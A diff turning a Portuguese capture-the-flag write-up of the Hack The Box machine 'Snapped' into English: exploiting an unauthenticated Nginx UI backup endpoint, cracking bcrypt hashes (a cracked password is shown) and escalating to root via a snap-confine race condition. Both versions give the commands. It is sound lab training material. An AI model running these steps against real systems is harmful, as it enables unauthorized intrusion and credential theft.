@@ -1,433 +1,199 @@
-# Hack The Box — Snapped
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%7C%20Nginx%20UI%20%7C%20Backup%20%7C%20Credentials%20%7C%20Privilege%20Escalation-red)
+Snapped is a Hard Linux machine. VHost fuzzing reveals an `admin` subdomain
+hosting **Nginx UI**, vulnerable to an unauthenticated backup download
+(CVE-2026-27944) that also leaks the data needed to decrypt it. The backup
+contains a SQLite database of bcrypt hashes; cracking `jonathan`'s hash grants
+SSH access. A SUID `snap-confine` is then exploited via **CVE-2026-3888**
+(snap-confine / systemd-tmpfiles LPE) to gain a root shell.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Snapped | Hard | Linux | Hack The Box |
 
-| Nome | Dificuldade | Plataforma | OS |
-| ---- | ----------- | ---------- | -- |
-| Snapped | Hard | Hack The Box | Linux |
+## Attack Path
 
----
+1. Nmap reveals SSH and an Nginx HTTP service.
+2. VHost fuzzing discovers `admin.snapped.htb`.
+3. The panel is identified as Nginx UI.
+4. An unauthenticated backup is downloaded (CVE-2026-27944).
+5. The backup is decrypted and analyzed.
+6. bcrypt hashes are extracted from the SQLite database.
+7. `jonathan`'s hash is cracked.
+8. SSH access is obtained as `jonathan`.
+9. A SUID `snap-confine` is found during enumeration.
+10. CVE-2026-3888 is exploited to create a SUID root shell.
 
-# Superfície de ataque
+## Reconnaissance
 
-1. Enumeração inicial com Nmap  
-2. Identificação de aplicação web em Nginx  
-3. Descoberta do virtual host `admin.snapped.htb`  
-4. Identificação do painel **Nginx UI**  
-5. Exploração de backup não autenticado via **CVE-2026-27944**  
-6. Download e descriptografia do backup  
-7. Extração de hashes bcrypt do banco SQLite  
-8. Crack do hash do usuário `jonathan`  
-9. Acesso via SSH como `jonathan`  
-10. Enumeração local do `snapd` e `snap-confine`  
-11. Exploração de **CVE-2026-3888**  
-12. Criação de shell SUID root  
-13. Leitura da flag de root  
+Initial enumeration was performed with **Nmap**.
 
----
-
-# Reconhecimento
-
-A enumeração inicial foi feita com Nmap para identificar portas abertas, versões dos serviços e possíveis vetores de ataque.
-
-```
+```bash
 nmap -sC -sV -A -T4 <IP>
 ```
 
-![Nmap](screenshots/nmap.png)
+| Port | Service | Notes |
+| --- | --- | --- |
+| 22 | SSH | OpenSSH 9.6p1 (Ubuntu) |
+| 80 | HTTP | Nginx 1.24.0, redirects to `snapped.htb` |
 
-O scan revelou uma superfície externa pequena:
+The host was added to `/etc/hosts`.
 
-- **22/tcp — SSH**: OpenSSH 9.6p1 Ubuntu
-- **80/tcp — HTTP**: Nginx 1.24.0
+## Web Enumeration
 
-O serviço HTTP retornava um redirect para o domínio:
+`http://snapped.htb` was a static corporate site with no obvious functionality.
+Since it used virtual host routing, the next step was subdomain fuzzing.
 
-```
-http://snapped.htb/
-```
+## Subdomain Enumeration
 
-Com isso, foi necessário adicionar o domínio ao `/etc/hosts`:
-
-```
-sudo nano /etc/hosts
-```
-
-```
-<IP> snapped.htb
-```
-
----
-
-# Enumeração Web
-
-Acessando `http://snapped.htb`, foi exibida uma página institucional chamada **Snapped**, relacionada a uma plataforma de infraestrutura.
-
-![Web](screenshots/web.png)
-
-A página principal parecia ser estática e não apresentava funcionalidades diretamente exploráveis. Como a aplicação usava virtual host, o próximo passo foi buscar subdomínios.
-
----
-
-# Enumeração de Subdomínios
-
-Foi utilizado `ffuf` para bruteforce de virtual hosts usando o header `Host`.
-
-```
+```bash
 ffuf -u http://snapped.htb \
   -H "Host: FUZZ.snapped.htb" \
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-  -mc 200
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200
 ```
 
-![FFUF](screenshots/ffuf.png)
+This revealed `admin.snapped.htb`, which was added to `/etc/hosts`. The subdomain
+hosted an **Nginx UI** login panel, identified as vulnerable to
+**CVE-2026-27944**.
 
-O resultado revelou o subdomínio:
+## Exploitation — Nginx UI Unauthenticated Backup (CVE-2026-27944)
 
-```
-admin.snapped.htb
-```
+CVE-2026-27944 affects Nginx UI before 2.3.3: the `/api/backup` endpoint is
+reachable without authentication and returns, in the `X-Backup-Security` header,
+the material needed to decrypt the backup. An unauthenticated attacker can
+download the backup and recover configs, the SQLite database, tokens and
+credentials.
 
-O `/etc/hosts` foi atualizado novamente:
-
-```
-<IP> snapped.htb admin.snapped.htb
-```
-
----
-
-# Painel Nginx UI
-
-Ao acessar o novo virtual host, foi exibida uma tela de login do **Nginx UI**.
-
-```
-http://admin.snapped.htb
-```
-
-![Nginx UI](screenshots/nginx-ui.png)
-
-Como não havia credenciais válidas nesse momento, a enumeração passou a focar nos endpoints expostos pela aplicação. Durante a análise, foi possível identificar que a instância do Nginx UI estava vulnerável ao **CVE-2026-27944**.
-
----
-
-# Exploração — CVE-2026-27944
-
-A vulnerabilidade **CVE-2026-27944** afeta versões do Nginx UI anteriores à 2.3.3. O problema ocorre porque o endpoint de backup pode ser acessado sem autenticação e retorna, no header `X-Backup-Security`, os dados necessários para descriptografar o backup.
-
-O endpoint vulnerável é:
-
-```
-/api/backup
-```
-
-Na prática, isso permite que um atacante não autenticado baixe o backup da aplicação e recupere arquivos sensíveis, como configurações, banco de dados SQLite, tokens e credenciais.
-
-Foi utilizado um script para baixar e descriptografar o backup automaticamente:
-
-```
+```bash
 python poc.py --target http://admin.snapped.htb --decrypt
 ```
 
-![CVE Backup](screenshots/cve.png)
+The script recovered and decrypted the backup, yielding files such as
+`hash_info.txt`, `nginx-ui.zip` and `nginx.zip`.
 
-O script recuperou o backup e extraiu arquivos como:
+## Backup Analysis
 
-```
-hash_info.txt
-nginx-ui.zip
-nginx.zip
-```
+A search through the extracted files surfaced sensitive data:
 
-Após a descriptografia, foram extraídos arquivos de configuração do Nginx e da aplicação Nginx UI.
-
----
-
-# Análise do Backup
-
-Após extrair os arquivos, foi feita uma busca por informações sensíveis dentro do backup.
-
-```
-grep -RniE "password|passwd|user|username|admin|secret|token|key|jwt|auth|database|db|mysql|postgres|sqlite|redis" .
+```bash
+grep -RniE "password|user|secret|token|key|jwt|sqlite|database" .
 ```
 
-![Grep](screenshots/grep.png)
+`app.ini` pointed at the application's SQLite database
+(`/var/lib/nginx-ui/database.db`) and exposed secrets like `JwtSecret`, but the
+key asset was the database itself.
 
-Foram encontrados dados relevantes em arquivos como:
+The `users` table was read with `sqlite3`:
 
-```
-nginx-ui/app.ini
-nginx-ui/database.db
-nginx/sites-available/nginx-ui
-```
-
-O arquivo `app.ini` indicava o caminho do banco SQLite usado pela aplicação:
-
-```
-/var/lib/nginx-ui/database.db
-```
-
-Também foram identificados secrets da aplicação, como `JwtSecret` e outros valores internos. Porém, o ponto mais importante para avanço foi o banco `database.db`.
-
----
-
-# Banco SQLite e Extração de Hashes
-
-O banco SQLite extraído do backup foi analisado com `sqlite3`.
-
-```
+```bash
 sqlite3 -header -column nginx-ui/database.db "SELECT * FROM users;"
 ```
 
-![Database Users](screenshots/db-users.png)
+Both `admin` and `jonathan` had bcrypt hashes; `jonathan`'s was saved for
+cracking.
 
-A tabela `users` revelou dois usuários principais:
+## Privilege Escalation
 
-```
-admin
-jonathan
-```
+### Cracking the hash
 
-Ambos possuíam hashes no formato bcrypt. O hash do usuário `jonathan` foi salvo em um arquivo para tentativa de crack.
-
----
-
-# Crack do Hash
-
-Como os hashes estavam em bcrypt, foi utilizado o John the Ripper com a wordlist `rockyou.txt`.
-
-```
+```bash
 john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 
-![John](screenshots/john.png)
-
-O hash do usuário `jonathan` foi quebrado com sucesso:
-
 ```
-jonathan:linkinpark
+jonathan : linkinpark
 ```
 
-Esse foi o ponto de transição entre exploração web e acesso ao sistema operacional.
+The password was reused for SSH:
 
----
-
-# Movimento Lateral — SSH como jonathan
-
-Com a senha recuperada, foi testado acesso via SSH.
-
-```
+```bash
 ssh jonathan@<IP>
 ```
 
-![SSH](screenshots/ssh.png)
+The user flag lives at `/home/jonathan/user.txt`.
 
-O login foi bem-sucedido, confirmando reutilização de credenciais entre a aplicação e o sistema.
+### Enumeration
 
----
+`jonathan` had no sudo rights, but enumeration found `snapd` with a SUID
+`snap-confine`:
 
-# Flag de Usuário
-
-Após acessar a máquina como `jonathan`, foi possível ler a flag de usuário no diretório home.
-
-```
-cat user.txt
-```
-
-![User Flag](screenshots/user-flag.png)
-
-```
-57c877.....................
-```
-
----
-
-# Enumeração para Escalação de Privilégio
-
-Com acesso como `jonathan`, o próximo objetivo foi identificar um caminho para root.
-
-Primeiro, foi verificado se o usuário possuía permissões via `sudo`.
-
-```
-sudo -l
-```
-
-O usuário não possuía permissão para executar comandos como root via `sudo`.
-
-Durante a enumeração do sistema, foi identificada a presença do `snapd` e do binário `snap-confine` com bit SUID ativo.
-
-```
-snap version
-```
-
-```text
-snap    2.63.1+24.04
-snapd   2.63.1+24.04
-series  16
-ubuntu  24.04
-kernel  6.17.0-19-generic
-```
-
-Também foi verificado o binário `snap-confine`:
-
-```
+```bash
+snap version          # snapd 2.63.1+24.04 on Ubuntu 24.04
 ls -l /usr/lib/snapd/snap-confine
+# -rwsr-xr-x 1 root root ... /usr/lib/snapd/snap-confine
 ```
 
-```
--rwsr-xr-x 1 root root 159016 Aug 20  2024 /usr/lib/snapd/snap-confine
-```
+### snap-confine LPE (CVE-2026-3888)
 
-O bit SUID indicava que o binário era executado com privilégios de root, tornando-o um alvo interessante para escalação de privilégio.
+The `snapd` version was vulnerable to **CVE-2026-3888**, a local privilege
+escalation abusing the interaction between `snap-confine` and
+`systemd-tmpfiles`. The exploit wins a race condition during namespace creation
+to replace the dynamic linker (`ld-linux-x86-64.so.2`) with a controlled
+payload, which the SUID `snap-confine` then loads as root.
 
----
+The exploit and payload were compiled and transferred:
 
-# CVE-2026-3888 — snap-confine / systemd-tmpfiles LPE
-
-A versão do `snapd` presente na máquina estava vulnerável ao **CVE-2026-3888**, uma falha de escalação local de privilégios envolvendo `snap-confine` e `systemd-tmpfiles`.
-
-A ideia geral da exploração é abusar da limpeza automática do diretório temporário usado pelo snap. Quando o diretório privado do snap é removido pelo `systemd-tmpfiles`, um atacante local pode recriar estruturas controladas dentro do ambiente temporário e vencer uma race condition durante a criação do namespace do `snap-confine`.
-
-O ponto crítico é substituir o dynamic linker:
-
-```
-ld-linux-x86-64.so.2
-```
-
-por um payload controlado. Quando o `snap-confine` SUID carrega esse linker dentro do namespace, o payload é executado com privilégios de root.
-
----
-
-# Preparação do Exploit
-
-Foi utilizado o exploit público para a variante SUID do `snap-confine`. Os arquivos foram compilados na máquina atacante.
-
-```
+```bash
 gcc -O2 -static -o exploit exploit_suid.c
 gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
-```
-
-Depois, os binários foram enviados para a máquina alvo via `scp`.
-
-```
 scp exploit librootshell.so jonathan@snapped.htb:/home/jonathan/
 ```
 
-![SCP](screenshots/scp.png)
+On the target, the exploit was run with the payload:
 
----
-
-# Escalação de Privilégio
-
-Na máquina alvo, o exploit foi executado passando o payload `librootshell.so` como argumento.
-
-```
+```bash
 ./exploit ./librootshell.so
 ```
 
-![Exploit](screenshots/exploit.png)
-
-O exploit passou pelas seguintes etapas principais:
-
-1. Entrou no sandbox do Firefox via snap  
-2. Aguardou a remoção do diretório `.snap` pelo `systemd-tmpfiles`  
-3. Destruiu o namespace cacheado  
-4. Venceu a race condition contra o `snap-confine`  
-5. Injetou o payload no namespace envenenado  
-6. Acionou o `snap-confine` SUID  
-7. Criou uma cópia SUID de `/bin/bash` em `/var/snap/firefox/common/bash`  
-
-O resultado foi uma shell com `euid=0`:
-
-```
-id
-```
+It won the race against `snap-confine`, injected the payload into the poisoned
+namespace, and created a SUID copy of bash, yielding `euid=0`:
 
 ```
 uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
 ```
 
-Isso confirmou a escalação de privilégios para root.
+The root flag lives at `/root/root.txt`.
 
----
+## Vulnerability Analysis
 
-# Flag de Root
+**Unauthenticated backup in Nginx UI (CVE-2026-27944)** — `/api/backup` was
+reachable without authentication and exposed the material to decrypt the backup,
+disclosing all configs, the database and secrets. Fix: upgrade Nginx UI,
+authenticate the backup endpoint, and never return decryption material to
+clients.
 
-Com a shell root obtida, a flag final foi lida em `/root/root.txt`.
+**Sensitive data in backup** — the backup contained a SQLite database with user
+hashes and application secrets. Fix: encrypt backups with keys held separately
+and restrict who can generate/download them.
 
-```
-cat /root/root.txt
-```
+**Crackable bcrypt hash** — `jonathan`'s bcrypt hash was cracked with a common
+wordlist, giving SSH access. Fix: enforce strong password policies.
 
-![Root Flag](screenshots/root-flag.png)
+**Credential reuse** — the application password was also valid for the local
+`jonathan` account. Fix: enforce unique credentials per service.
 
-```
-627130.....................
-```
+**Local privilege escalation (CVE-2026-3888)** — a vulnerable `snapd` allowed
+abusing `snap-confine` / `systemd-tmpfiles` for root. Fix: patch snapd and keep
+the OS updated.
 
----
-
-# Vulnerabilidades Identificadas
-
-### Backup não autenticado no Nginx UI — CVE-2026-27944
-
-O endpoint `/api/backup` estava acessível sem autenticação e expunha material criptográfico suficiente para descriptografar o backup da aplicação.
-
-### Exposição de dados sensíveis em backup
-
-O backup continha arquivos de configuração, banco SQLite e dados sensíveis da aplicação, incluindo hashes de usuários.
-
-### Hash bcrypt crackável
-
-O hash do usuário `jonathan` foi quebrado com uma wordlist comum, permitindo acesso ao sistema via SSH.
-
-### Reutilização de credenciais
-
-A senha recuperada da aplicação também era válida para o usuário local `jonathan` via SSH.
-
-### Escalação local via snap-confine — CVE-2026-3888
-
-A versão vulnerável do `snapd` permitiu abusar da interação entre `snap-confine` e `systemd-tmpfiles` para executar código como root.
-
----
-
-# Ferramentas Utilizadas
+## Tools Used
 
 - Nmap
-- FFUF
-- Python3
-- SQLite3
-- grep
+- ffuf
+- Python 3
+- sqlite3
 - John the Ripper
-- RockYou
-- SSH
-- SCP
+- SSH / SCP
 - GCC
-- Exploit público para CVE-2026-3888
+- Public CVE-2026-3888 exploit
 
----
+## Key Takeaways
 
-# Principais Aprendizados
-
-- Virtual hosts devem ser enumerados quando o servidor HTTP redireciona para um domínio específico.
-- Painéis administrativos expostos podem revelar endpoints internos interessantes mesmo sem login.
-- Backups acessíveis sem autenticação podem comprometer toda a aplicação.
-- Não basta criptografar backups se a chave ou o IV também são entregues ao atacante.
-- Bancos SQLite em backups costumam conter credenciais, tokens e configurações sensíveis.
-- Hashes bcrypt ainda podem ser quebrados quando a senha é fraca ou comum.
-- Reutilização de senha entre aplicação e sistema operacional facilita movimento lateral.
-- Binários SUID devem ser investigados com atenção durante a enumeração local.
-- Vulnerabilidades locais recentes em componentes do sistema, como `snapd`, podem ser decisivas em máquinas Linux modernas.
-- Race conditions podem exigir múltiplas tentativas e dependem bastante do estado do ambiente.
-
----
-
-# Autor
-
-https://github.com/ninjaa-exe
+- Enumerate virtual hosts whenever the web server redirects to a specific domain.
+- Backups accessible without authentication can compromise an entire application.
+- Encrypting a backup is pointless if the key or IV is handed to the attacker.
+- SQLite databases in backups commonly hold credentials, tokens and configs.
+- Password reuse between an app and the OS enables easy lateral movement.
+- SUID binaries deserve close attention; recent local CVEs (like in `snapd`) can be decisive on modern Linux.
